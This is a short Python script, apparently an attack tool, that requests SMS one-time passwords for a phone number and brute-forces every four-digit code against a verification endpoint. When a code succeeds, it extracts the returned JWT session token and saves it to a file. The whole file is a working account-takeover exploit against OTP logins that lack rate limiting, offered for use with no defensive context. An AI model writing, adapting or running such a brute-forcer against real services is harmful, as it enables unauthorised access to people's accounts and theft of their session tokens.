import requests
import re

# URL of the endpoint that sends the SMS OTP
otp_url = 'https://example.com/send_otp'

# URL of the endpoint that verifies the OTP
verify_url = 'https://example.com/verify_otp'

# Your phone number or user ID for the SMS OTP
phone_number = '1234567890'

# File to save JWT tokens
jwt_file = 'jwt_tokens.txt'

def send_otp_and_bruteforce():
    session = requests.Session()

    while True:
        # Step 1: Send the OTP request
        otp_payload = {
            'phone_number': phone_number,
            # Additional required parameters
        }

        response = session.post(otp_url, data=otp_payload)
        
        if response.status_code == 200:
            print("OTP sent successfully.")

            # Step 2: Brute-force the OTP
            for otp in range(1, 10000):  # Bruteforcing from 0001 to 9999
                otp_code = str(otp).zfill(4)
                print(f"Trying OTP: {otp_code}")
                
                verify_payload = {
                    'phone_number': phone_number,
                    'otp': otp_code,
                    # Additional required parameters
                }
                
                verify_response = session.post(verify_url, data=verify_payload)
                
                if verify_response.status_code == 200 and "JWT" in verify_response.text:
                    print(f"OTP {otp_code} is valid! Logged in successfully.")
                    
                    # Extract the JWT token using regex or string manipulation
                    jwt_token = extract_jwt(verify_response.text)
                    
                    if jwt_token:
                        save_jwt(jwt_token)
                        print(f"JWT token saved: {jwt_token}")
                    
                    break  # If successful, break out of the brute-force loop
                else:
                    print(f"OTP {otp_code} is invalid.")
        else:
            print("Failed to send OTP. Check the request details.")

def extract_jwt(response_text):
    # Use regex to extract JWT token (assuming it follows typical JWT patterns)
    jwt_pattern = r'eyJ[^"]+'  # Adjust pattern according to the exact response structure
    match = re.search(jwt_pattern, response_text)
    
    if match:
        return match.group(0)
    return None

def save_jwt(jwt_token):
    with open(jwt_file, 'a') as file:
        file.write(jwt_token + '\n')

# Main function
if __name__ == "__main__":
    send_otp_and_bruteforce()
